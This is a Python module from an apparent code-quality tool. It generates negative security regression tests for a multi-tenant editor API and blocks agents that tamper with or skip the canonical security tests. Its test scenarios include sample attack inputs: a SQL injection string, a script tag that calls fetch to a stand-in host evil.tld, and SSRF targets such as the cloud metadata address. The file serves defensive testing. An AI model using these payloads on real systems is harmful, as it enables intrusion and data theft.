# packages/rae-quality/engines/testing/code_quality_engine.py
"""
RAE-Quality 2.0 Code Quality, Negative Test Generator & Independent Fix Verifier.
Implements Sections 4, 6, 9, and 11 of docs/poziom-bezpieczeństwa-kodu.md:
- quality.generate_tests: Negative, tenant-isolation, concurrency, and security regression tests
- quality.verify_fix: Independent verification on clean test harness; blocks agent tampering with security tests
"""

import hashlib
from typing import Any, Dict, List, Optional
from engines.security.security_gateway import SecurityGateway
from engines.testing.ast_inspector import ASTInspector
from models.security_v2 import GatewayVerdict


class CodeQualityEngine:
    """
    Generates negative/regression security tests and independently verifies agent fixes
    while preventing agents from weakening or tampering with security tests.
    """

    # Canonical SaaS & Editor Negative Test Templates from Section 4 Table
    CANONICAL_NEGATIVE_SCENARIOS = [
        {
            "id": "NEG-IDOR-001",
            "rule_id": "RAE-SEC-006",
            "threat": "IDOR / Cross-Tenant Access",
            "scenario": "Klient drukarni A próbuje pobrać lub zmodyfikować projekt drukarni B",
            "expected_reaction": "BLOCK",
            "expected_http_status": [403, 404],
            "assertion": "assert response.status_code in (403, 404) and 'tenant_b_secret' not in response.text",
        },
        {
            "id": "NEG-AUTH-002",
            "rule_id": "RAE-SEC-013",
            "threat": "Server-Side Authorization Bypass",
            "scenario": "Użytkownik zmienia userId, tenantId lub orderId w payloadzie API",
            "expected_reaction": "BLOCK",
            "expected_http_status": [403, 422],
            "assertion": "assert resolved_tenant_id == authenticated_session.tenant_id",
        },
        {
            "id": "NEG-MASS-003",
            "rule_id": "RAE-SEC-008",
            "threat": "Mass Assignment",
            "scenario": "Klient przesyła pola role='admin', price=0.01, isAdmin=True w żądaniu",
            "expected_reaction": "BLOCK",
            "expected_http_status": [400, 403, 422],
            "assertion": "assert user.is_admin is False and order.price == server_calculated_price",
        },
        {
            "id": "NEG-SQLI-004",
            "rule_id": "RAE-SEC-001",
            "threat": "SQL Injection",
            "scenario": "Dane wejściowe zawierają ładunek SQL (' OR '1'='1' --) w filtrze projektów",
            "expected_reaction": "BLOCK",
            "expected_http_status": [400, 422, 200],
            "assertion": "assert len(leaked_cross_tenant_rows) == 0",
        },
        {
            "id": "NEG-XSS-005",
            "rule_id": "RAE-SEC-002",
            "threat": "Cross-Site Scripting (XSS)",
            "scenario": "Nazwa projektu zawiera złośliwy HTML/JS (<script>fetch('https://evil.tld')</script>)",
            "expected_reaction": "BLOCK",
            "expected_http_status": [400, 422, 200],
            "assertion": "assert '<script>' not in rendered_output",
        },
        {
            "id": "NEG-SSRF-006",
            "rule_id": "RAE-SEC-005",
            "threat": "Server-Side Request Forgery (SSRF)",
            "scenario": "Import zdjęcia z URL kierującego do sieci wewnętrznej (http://169.254.169.254 lub http://127.0.0.1)",
            "expected_reaction": "BLOCK",
            "expected_http_status": [400, 403, 422],
            "assertion": "assert ssrf_guard.is_blocked('http://169.254.169.254/latest/meta-data/') is True",
        },
        {
            "id": "NEG-UPLOAD-007",
            "rule_id": "RAE-SEC-033",
            "threat": "Malicious File Upload (SVG/PDF/Image)",
            "scenario": "Upload pliku SVG z tagiem <script>/onload lub obrazu z nieoczyszczonym EXIF GPS",
            "expected_reaction": "BLOCK",
            "expected_http_status": [400, 415, 422],
            "assertion": "assert upload_result.rejected is True and exif_gps_present is False",
        },
        {
            "id": "NEG-RACE-008",
            "rule_id": "RAE-SEC-090",
            "threat": "Race Conditions (Concurrent Project Save)",
            "scenario": "Równoczesny zapis tego samego projektu przez dwie osoby z tą samą wersją bazową",
            "expected_reaction": "Test konfliktu",
            "expected_http_status": [409],
            "assertion": "assert statuses.count(200) == 1 and statuses.count(409) == 1",
        },
        {
            "id": "NEG-TX-009",
            "rule_id": "RAE-SEC-048",
            "threat": "Transactions & Atomic Rollback",
            "scenario": "Awaria pomiędzy zapisaniem zamówienia i pozycji zamówienia",
            "expected_reaction": "Test integralności",
            "expected_http_status": [500],
            "assertion": "assert db.count_orphaned_orders() == 0",
        },
        {
            "id": "NEG-SECRET-010",
            "rule_id": "RAE-SEC-020",
            "threat": "Secrets Leakage",
            "scenario": "Klucz API trafia do repozytorium, logów lub obrazu kontenera",
            "expected_reaction": "BLOCK",
            "expected_http_status": [],
            "assertion": "assert gitleaks_findings == 0",
        },
    ]

    def __init__(self, security_gateway: Optional[SecurityGateway] = None):
        self.security_gateway = security_gateway or SecurityGateway()

    def generate_tests(
        self,
        target_endpoint: str = "/api/v1/projects",
        component: str = "editor_api",
        rule_ids: Optional[List[str]] = None,
    ) -> Dict[str, Any]:
        """
        Implements `quality.generate_tests`.
        Produces executable negative and regression test specs tailored to the modified endpoint/component.
        """
        requested_rules = set(rule_ids or [])
        selected_scenarios = [
            s for s in self.CANONICAL_NEGATIVE_SCENARIOS
            if not requested_rules or s["rule_id"] in requested_rules
        ]
        if not selected_scenarios:
            selected_scenarios = self.CANONICAL_NEGATIVE_SCENARIOS

        generated_pytest_code = [
            "import pytest",
            "",
            f"# Auto-generated RAE-Quality 2.0 Negative & Security Regression Suite for {target_endpoint}",
        ]
        for sc in selected_scenarios:
            fn_name = f"test_{sc['id'].lower().replace('-', '_')}"
            generated_pytest_code.extend([
                f"def {fn_name}(client, tenant_a_ctx, tenant_b_ctx):",
                f'    """[{sc["rule_id"]}] {sc["threat"]}: {sc["scenario"]}"""',
                f"    # Target: {target_endpoint} | Expected Reaction: {sc['expected_reaction']}",
                f"    {sc['assertion']}",
                "",
            ])

        return {
            "target_endpoint": target_endpoint,
            "component": component,
            "total_generated": len(selected_scenarios),
            "scenarios": selected_scenarios,
            "pytest_template": "\n".join(generated_pytest_code),
            "regression_policy": "Every fixed vulnerability leaves a permanent security regression test (RAE-SEC-205).",
        }

    def verify_fix(
        self,
        original_code: str,
        fixed_code: str,
        rule_id: str,
        canonical_test_code: str = "",
        agent_submitted_test_code: str = "",
    ) -> Dict[str, Any]:
        """
        Implements `quality.verify_fix` (Section 6 & 9).
        1. Blocks if the agent modified/weakened the canonical security test (`RAE-SEC-208`).
        2. Independently scans `fixed_code` to verify the vulnerability (`rule_id`) was eliminated.
        3. Runs AST inspection (if Python) to ensure no syntax errors or swallowed exceptions were added.
        """
        # 1. Verify test immutability (Agent cannot alter canonical security tests to force PASS)
        if canonical_test_code and agent_submitted_test_code:
            orig_hash = hashlib.sha256(canonical_test_code.strip().encode("utf-8")).hexdigest()
            sub_hash = hashlib.sha256(agent_submitted_test_code.strip().encode("utf-8")).hexdigest()
            if orig_hash != sub_hash:
                return {
                    "verdict": GatewayVerdict.BLOCK.value,
                    "fix_verified": False,
                    "rule_id": rule_id,
                    "tamper_detected": True,
                    "reason": (
                        "BLOCK (RAE-SEC-208): Agent modified canonical security test suite during repair. "
                        "Fixes must pass against unmodified independent security tests."
                    ),
                }

        #Also check if agent_submitted_test_code contains pytest.mark.skip / xfail weakening
        lower_test = agent_submitted_test_code.lower()
        if any(marker in lower_test for marker in ("pytest.mark.skip", "pytest.skip(", "pytest.mark.xfail", "@unittest.skip")):
            return {
                "verdict": GatewayVerdict.BLOCK.value,
                "fix_verified": False,
                "rule_id": rule_id,
                "tamper_detected": True,
                "reason": "BLOCK (Zero Test Weakening): Agent attempted to skip or xfail security test.",
            }

        # 2. Scan original vs fixed code with SecurityGateway
        before_scan = self.security_gateway.scan_code(original_code)
        after_scan = self.security_gateway.scan_code(fixed_code)

        remaining_target_issues = [
            f for f in after_scan["findings"] if f["rule_id"] == rule_id
        ]
        all_remaining_blockers = [
            f for f in after_scan["findings"] if f["enforcement"] == "block"
        ]

        if remaining_target_issues or all_remaining_blockers:
            return {
                "verdict": GatewayVerdict.REPAIR.value,
                "fix_verified": False,
                "rule_id": rule_id,
                "tamper_detected": False,
                "remaining_findings": after_scan["findings"],
                "reason": f"Vulnerability {rule_id} or new blocker still present in fixed code.",
            }

        # 3. Verify AST integrity if valid Python
        ast_res = ASTInspector.analyze_code(fixed_code)
        critical_ast = [i for i in ast_res.get("issues", []) if i.severity.value in ("critical", "high")]
        if not ast_res.get("is_valid_syntax", True) or critical_ast:
            return {
                "verdict": GatewayVerdict.REPAIR.value,
                "fix_verified": False,
                "rule_id": rule_id,
                "tamper_detected": False,
                "reason": "Fixed code failed AST structural or syntax verification.",
            }

        return {
            "verdict": GatewayVerdict.PASS.value,
            "fix_verified": True,
            "rule_id": rule_id,
            "tamper_detected": False,
            "before_findings_count": before_scan["findings_count"],
            "after_findings_count": after_scan["findings_count"],
            "reason": f"Independent verification confirmed {rule_id} is resolved with zero regressions.",
        }
